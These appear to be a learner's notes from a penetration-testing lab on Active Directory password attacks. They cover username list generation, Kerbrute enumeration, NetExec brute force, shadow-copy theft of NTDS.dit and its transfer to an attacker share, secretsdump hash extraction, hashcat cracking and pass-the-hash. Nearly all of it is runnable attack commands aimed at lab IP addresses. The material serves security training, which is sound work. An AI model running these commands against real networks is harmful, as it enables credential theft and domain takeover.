![[Pasted image 20260509153832.png]]
## Dictionary attacks against AD accounts using NetExec
|Username convention|Practical example for `Jane Jill Doe`|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|
#### Creating a custom list of usernames

```shell
3kjS@htb[/htb]$ cat usernames.txt 
bwilliamson 
benwilliamson 
ben.willamson 
willamson.ben 
bburgerstien 
bobburgerstien 
bob.burgerstien 
burgerstien.bob 
jstevenson 
jimstevenson 
jim.stevenson 
stevenson.jim
```

tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) automated list generator

```shell
3kjS@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt
```
#### Enumerating valid usernames with Kerbrute

```shell
3kjS@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```
#### Launching a brute-force attack with NetExec

```shell
3kjS@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
#### Event logs from the attack
![[Pasted image 20260509155404.png]]
## Capturing NTDS.dit
#### Connecting to a DC with Evil-WinRM

```shell
3kjS@htb[/htb]$ evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```
#### Checking local group membership

```shell
*Evil-WinRM* PS C:\> net localgroup
```
#### Checking user account privileges including domain

```shell
*Evil-WinRM* PS C:\> net user bwilliamson
```
#### Creating shadow copy of C:

```shell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```
#### Copying NTDS.dit from the VSS

```shell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit 
			1 file(s) copied.
```
**Note:** As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.
#### Transferring NTDS.dit to attack host

```shell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
			1 file(s) moved.
```
#### Extracting hashes from NTDS.dit

```shell
3kjS@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
#### A faster method: Using NetExec to capture NTDS.dit

```shell
3kjS@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```
## Cracking hashes and gaining credentials
#### Cracking a single hash with Hashcat

```shell
3kjS@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
## Pass the Hash (PtH) considerations
#### Pass the Hash (PtH) with Evil-WinRM Example

```shell
3kjS@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

